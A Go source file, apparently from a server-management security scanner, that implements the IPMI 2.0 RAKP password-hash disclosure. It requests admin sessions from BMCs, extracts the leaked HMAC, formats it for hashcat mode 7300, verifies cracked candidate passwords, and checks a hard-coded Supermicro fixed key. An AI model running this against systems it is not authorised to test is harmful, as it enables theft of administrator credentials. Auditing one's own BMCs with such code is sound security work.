package ipmi

import (
	"bytes"
	"crypto/hmac"
	"crypto/md5"
	"crypto/rand"
	"crypto/sha1"
	"crypto/sha256"
	"encoding/binary"
	"encoding/hex"
	"errors"
	"fmt"
	"hash"
	"time"
)

var smcRAKPFixedKey = decodeHexConst("fab979d849be933dd0c41fd2c9d77a30aa8d3f50")

func decodeHexConst(s string) []byte {
	b, err := hex.DecodeString(s)
	if err != nil {
		panic(err)
	}
	return b
}

// RAKPResult bundles a successful RAKP-1/2 exchange. RAKPHash is the BMC's HMAC
// (SHA1, MD5 or SHA256 per the negotiated algo) keyed by the account password over
//
//	client_SID(4) | bmc_SID(4) | client_rand(16) | bmc_rand(16) |
//	bmc_GUID(16) | requested_priv(1) | username_len(1) | username(N)
//
// which is the hashcat -m 7300 "IPMI2 RAKP HMAC-SHA1" format.
type RAKPResult struct {
	Host           string
	Username       string
	AuthAlgo       byte
	IntegrityAlgo  byte
	ConfAlgo       byte
	ClientSID      uint32
	BMCSID         uint32
	ClientRand     []byte
	BMCRand        []byte
	BMCGUID        []byte
	RAKPHash       []byte // HMAC over the fields above, keyed by password
	ErrorCode      byte   // from RAKP-2 status field
	OpenSessionRaw []byte
	RAKP2Raw       []byte

	// Crack is set by credential validation (rakp_active.go / crack.go) when a
	// candidate password recovered the account offline. nil until then.
	Crack *CrackResult
}

// Hashcat returns the -m 7300 "IPMI2 RAKP HMAC-SHA1" line. This mode is only
// defined for HMAC-SHA1 with a full 20-byte HMAC; emitting a line for any other
// algorithm (or a truncated hash) yields an uncrackable candidate, so we return
// an empty string in that case rather than a bogus line.
func (r *RAKPResult) Hashcat() string {
	// hashcat mode 7300 is defined only for HMAC-SHA1 with a full 20-byte HMAC.
	if r.AuthAlgo != RAKPHMACSHA1 || len(r.RAKPHash) != sha1.Size {
		return ""
	}
	return r.SaltHashLine()
}

// SaltHashLine returns the "salt:hmac" pair (both hex) for the leaked RAKP-2
// HMAC. The salt is the exact RAKP-2 HMAC input: SIDc(LE) | SIDm(LE) | Rc | Rm |
// GUIDm | role(0x14) | ulen | username. For HMAC-SHA1 that is the hashcat -m 7300
// line; MD5/SHA256 have no hashcat mode and are cracked offline in-process.
func (r *RAKPResult) SaltHashLine() string {
	if len(r.RAKPHash) == 0 {
		return ""
	}
	return fmt.Sprintf("%x:%x", r.Salt(), r.RAKPHash)
}

// Salt returns the raw RAKP-2 HMAC input bytes (the offline-crack salt):
// SIDc(LE) | SIDm(LE) | Rc | Rm | GUIDm | role(0x14) | ulen | username. This is
// the authoritative layout shared by SaltHashLine, Hashcat, and the offline
// cracker (hashdump/hashcrack) so there is a single source of truth. The bytes
// are binary, may contain nulls, and are bounded.
func (r *RAKPResult) Salt() []byte {
	guid := r.BMCGUID
	if len(guid) < 16 {
		guid = append(append([]byte(nil), guid...), make([]byte, 16-len(guid))...)
	} else if len(guid) > 16 {
		guid = guid[:16]
	}
	var salt []byte
	salt = binary.LittleEndian.AppendUint32(salt, r.ClientSID)
	salt = binary.LittleEndian.AppendUint32(salt, r.BMCSID)
	salt = append(salt, r.ClientRand...)
	salt = append(salt, r.BMCRand...)
	salt = append(salt, guid...)
	salt = append(salt, 0x14, byte(len(r.Username)))
	salt = append(salt, r.Username...)
	return salt
}

// DoRAKP12 performs Open Session + RAKP-1 and parses RAKP-2. It does not continue
// to RAKP-3/4 -- the point of this probe is to extract the RAKP-2 HMAC (the
// password hash leak that is unpatchable by design).
//
// algo must be RAKPHMACSHA1 / RAKPHMACMD5 / RAKPHMACSHA256. Use IntegrityNone
// and ConfNone for the initial probe so the BMC doesn't silently drop us.
func DoRAKP12(host string, port int, username string, authAlgo, intAlgo, confAlgo byte, timeout time.Duration) (*RAKPResult, error) {
	c, err := NewClient(host, port, timeout)
	if err != nil {
		return nil, err
	}
	defer c.Close()

	// Random client SID + 16-byte client random.
	var cSID uint32
	_ = binary.Read(rand.Reader, binary.LittleEndian, &cSID)
	if cSID == 0 {
		cSID = 0xa0a2a3a4
	}
	cRand := make([]byte, 16)
	if _, err := rand.Read(cRand); err != nil {
		return nil, err
	}

	// --- Open Session Request (payload type 0x10) ---
	var os bytes.Buffer
	os.WriteByte(0x00)           // message tag
	os.WriteByte(0x04)           // requested max privilege (admin)
	os.Write([]byte{0x00, 0x00}) // reserved
	_ = binary.Write(&os, binary.LittleEndian, cSID)
	// Auth payload: type=0 (auth algo), reserved x2, len=8, value(algo+padding)
	os.Write([]byte{0x00, 0x00, 0x00, 0x08})
	os.WriteByte(authAlgo)
	os.Write([]byte{0, 0, 0})
	// Integrity payload
	os.Write([]byte{0x01, 0x00, 0x00, 0x08})
	os.WriteByte(intAlgo)
	os.Write([]byte{0, 0, 0})
	// Confidentiality payload
	os.Write([]byte{0x02, 0x00, 0x00, 0x08})
	os.WriteByte(confAlgo)
	os.Write([]byte{0, 0, 0})

	osPkt := buildRMCPPlus(PayloadOpenSessionReq, 0, 0, os.Bytes())
	osResp, err := c.Send(osPkt)
	if err != nil {
		return nil, fmt.Errorf("open-session: %w", err)
	}

	res := &RAKPResult{
		Host:           host,
		Username:       username,
		AuthAlgo:       authAlgo,
		IntegrityAlgo:  intAlgo,
		ConfAlgo:       confAlgo,
		ClientSID:      cSID,
		ClientRand:     cRand,
		OpenSessionRaw: osResp,
	}

	bmcSID, err := parseOpenSessionResp(osResp)
	if err != nil {
		return res, fmt.Errorf("open-session parse: %w", err)
	}
	res.BMCSID = bmcSID

	// --- RAKP-1 (payload type 0x12) ---
	var r1 bytes.Buffer
	r1.WriteByte(0x00) // message tag
	r1.Write([]byte{0, 0, 0})
	_ = binary.Write(&r1, binary.LittleEndian, bmcSID)
	r1.Write(cRand)
	r1.WriteByte(0x14)     // requested priv (admin | bit4)
	r1.Write([]byte{0, 0}) // reserved
	r1.WriteByte(byte(len(username)))
	r1.WriteString(username)

	r1Pkt := buildRMCPPlus(PayloadRAKP1, 0, 0, r1.Bytes())
	r2Resp, err := c.Send(r1Pkt)
	if err != nil {
		return res, fmt.Errorf("rakp1: %w", err)
	}
	res.RAKP2Raw = r2Resp
	if err := parseRAKP2(r2Resp, res); err != nil {
		return res, err
	}
	return res, nil
}

// VerifyRAKPPassword recomputes the RAKP-2 HMAC with the supplied password
// and returns true on match. Used by `oobscan crack` to confirm candidates.
func (r *RAKPResult) VerifyRAKPPassword(password string) bool {
	return r.VerifyRAKPKey([]byte(password))
}

// VerifyRAKPKey recomputes the RAKP-2 HMAC using an explicit key.
func (r *RAKPResult) VerifyRAKPKey(key []byte) bool {
	var mac hash.Hash
	// The HMAC key is the raw password. HMAC (RFC 2104) internally zero-pads any
	// sub-block-size key to the 64-byte block, so this matches conformant BMCs and
	// hashcat -m 7300. Do not pre-pad or truncate to 16/20/32 bytes: truncation
	// silently diverges from hashcat for passwords over 16 bytes.
	switch r.AuthAlgo {
	case RAKPHMACSHA1:
		mac = hmac.New(sha1.New, key)
	case RAKPHMACMD5:
		mac = hmac.New(md5.New, key)
	case RAKPHMACSHA256:
		mac = hmac.New(sha256.New, key)
	default:
		return false
	}
	var buf bytes.Buffer
	_ = binary.Write(&buf, binary.LittleEndian, r.ClientSID)
	_ = binary.Write(&buf, binary.LittleEndian, r.BMCSID)
	buf.Write(r.ClientRand)
	buf.Write(r.BMCRand)
	buf.Write(r.BMCGUID)
	buf.WriteByte(0x14) // requested priv (admin | bit4)
	buf.WriteByte(byte(len(r.Username)))
	buf.WriteString(r.Username)
	mac.Write(buf.Bytes())
	return hmac.Equal(mac.Sum(nil), r.RAKPHash)
}

// UsesSMCRAKPFixedKey reports whether this leak was generated with the known
// Supermicro fixed SMCRAKP key path observed in ATEN firmware.
func (r *RAKPResult) UsesSMCRAKPFixedKey() bool {
	return r.VerifyRAKPKey(smcRAKPFixedKey)
}

// BuildRMCPPlus is the exported wrapper for buildRMCPPlus. It frames a payload
// in an RMCP+ header with IPMI 2.0 session 0 (sessionless). Used by checks that
// need to craft raw RMCP+ packets (e.g. the default userKey bypass probe).
func BuildRMCPPlus(payloadType byte, body []byte) []byte {
	return buildRMCPPlus(payloadType, 0, 0, body)
}

// RmcpPlusPayload is the exported wrapper for rmcpPlusPayload. It extracts the
// payload from an RMCP+ packet (skipping the RMCP + IPMI 2.0 session header).
func RmcpPlusPayload(pkt []byte) ([]byte, error) {
	return rmcpPlusPayload(pkt)
}

// BuildRMCPPlusWithSID is the exported wrapper for buildRMCPPlusSID. It frames
// a payload in an RMCP+ header with a specific BMC session ID.
func BuildRMCPPlusWithSID(payloadType byte, sid uint32, body []byte) []byte {
	return buildRMCPPlusSID(payloadType, sid, 0, body)
}

// buildRMCPPlus frames a payload in an RMCP+ header with IPMI 2.0 session 0
// (session ID and sequence both zero, as used during session setup). authType
// and payloadEnc are accepted for call-site clarity but are always zero here:
// session-setup payloads carry no encrypt/auth bits.
func buildRMCPPlus(payloadType byte, authType, payloadEnc byte, body []byte) []byte {
	_ = authType
	_ = payloadEnc
	return buildRMCPPlusSID(payloadType, 0, 0, body)
}

func rmcpPlusPayload(pkt []byte) ([]byte, error) {
	// RMCP(4) + IPMI2 session hdr(12) + payload
	if len(pkt) < 16 {
		return nil, errors.New("short RMCP+ packet")
	}
	payloadLen := int(binary.LittleEndian.Uint16(pkt[14:16]))
	if len(pkt) < 16+payloadLen {
		return nil, errors.New("truncated RMCP+ payload")
	}
	return pkt[16 : 16+payloadLen], nil
}

// parseOpenSessionResp extracts the BMC-managed system ID from an Open
// Session Response (payload type 0x11).
func parseOpenSessionResp(pkt []byte) (uint32, error) {
	bmcSID, _, err := parseOpenSessionRespFull(pkt)
	return bmcSID, err
}

// parseOpenSessionRespFull also returns the Maximum Privilege Level the BMC
// advertised. That byte is the channel ceiling, not what the account gets: an
// empty-username session that actually lands at privilege 0 can still get
// ADMINISTRATOR here. Callers that measure real privilege keep it only to
// record the discrepancy.
func parseOpenSessionRespFull(pkt []byte) (uint32, byte, error) {
	payload, err := rmcpPlusPayload(pkt)
	if err != nil {
		return 0, 0, fmt.Errorf("open-session parse: %w", err)
	}
	// A rejection is allowed to stop after the console session ID (8 bytes), and
	// real BMCs do exactly that, so the status byte has to be read before the
	// full-length gate. Checking length first reported every rejection as
	// "short open-session payload" and hid the actual reason.
	if len(payload) < 2 {
		return 0, 0, errors.New("short open-session payload")
	}
	if status := payload[1]; status != 0 {
		return 0, 0, fmt.Errorf("open-session rejected: status=0x%02x (%s)", status, rakpStatusText(status))
	}
	if len(payload) < 12 {
		return 0, 0, errors.New("short open-session payload")
	}
	// Open Session Response layout (IPMI 2.0 Table 13-10):
	//   tag(1) status(1) maxPriv(1) rsvd(1)
	//   remoteConsoleSID(4)  <- payload[4:8], our own SID echoed back
	//   managedSystemSID(4)  <- payload[8:12], the BMC's session ID
	// RAKP-1 must reference the *managed system* SID; reading payload[4:8]
	// here sends our console SID back and the BMC rejects RAKP-1 with
	// status 0x08 (Invalid Session ID), yielding a truncated RAKP-2.
	bmcSID := binary.LittleEndian.Uint32(payload[8:12])
	return bmcSID, payload[2] & 0x0f, nil
}

// ParseOpenSessionResponse is the exported counterpart of parseOpenSessionResp.
// It is provided for fuzz testing (F3) and external use.
func ParseOpenSessionResponse(pkt []byte) (uint32, error) {
	return parseOpenSessionResp(pkt)
}

// parseRAKP2 populates BMCRand/BMCGUID/RAKPHash/ErrorCode.
func parseRAKP2(pkt []byte, r *RAKPResult) error {
	p, err := rmcpPlusPayload(pkt)
	if err != nil {
		return fmt.Errorf("rakp2 parse: %w", err)
	}
	if len(p) < 40 {
		return errors.New("short RAKP2 payload")
	}
	// Layout: tag(1) | status(1) | rsvd(2) | clientSID(4) | bmcRand(16) |
	//         bmcGUID(16) | keyExchangeAuthCode (N)
	r.ErrorCode = p[1]
	r.BMCRand = append([]byte(nil), p[8:24]...)
	r.BMCGUID = append([]byte(nil), p[24:40]...)
	if len(p) > 40 {
		r.RAKPHash = append([]byte(nil), p[40:]...)
	}
	if r.ErrorCode != 0 {
		return fmt.Errorf("RAKP2 status=0x%02x", r.ErrorCode)
	}
	if len(r.RAKPHash) == 0 {
		return errors.New("RAKP2 did not contain HMAC")
	}
	return nil
}
